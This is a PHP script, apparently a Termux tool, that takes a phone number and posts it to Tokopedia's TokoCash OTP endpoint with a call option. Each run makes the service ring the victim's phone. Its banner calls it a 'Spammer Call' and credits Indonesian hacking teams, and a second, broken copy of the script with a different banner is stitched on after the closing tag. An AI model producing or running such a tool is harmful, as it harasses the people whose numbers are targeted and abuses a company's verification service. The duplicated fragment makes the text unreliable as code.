<?php
// Limit 5x Telpon Setiap Satu Nomor
function send($phone){
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
echo "
==================================================
    Spammer Call From TOKOPEDIA
    Mod By      : ARWA TUTORIAL 
    Contact Me  : arifynarif305@gmail.com 
    Author      : RIFARIF'ARIFYN 
    Support     : Termux Indonesia 
    Facebook    : RIFARIF'ARIFYN 
    Thanks to   : ARWA TEAM 
    Penggunaan  : Awali Dengan Doa  [62]
==================================================\n";
echo "Nomor\nInput : ";
$nomor = trim(fgets(STDIN));
$execute = send($nomor);
print $execute;
?>
 "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
        curl_close($ch);
                echo $asw."\n";
}
echo "
==================================================
    Spammer Call From TOKOPEDIA
    Mod By      : ARWA TUTORIAL 
    Contact Me  : arifynarif305@gmail.com 
    Author      : RIFARIF'ARIFYN 
    Support     : InDoNeSiA CYBER   eRoR SyStEm
    FACEBOOK  : RIFARIF'ARIFYN 
    Thanks to   : ICES TEAM
    Penggunaan  : Awali Dengan Doa  [62]
==================================================
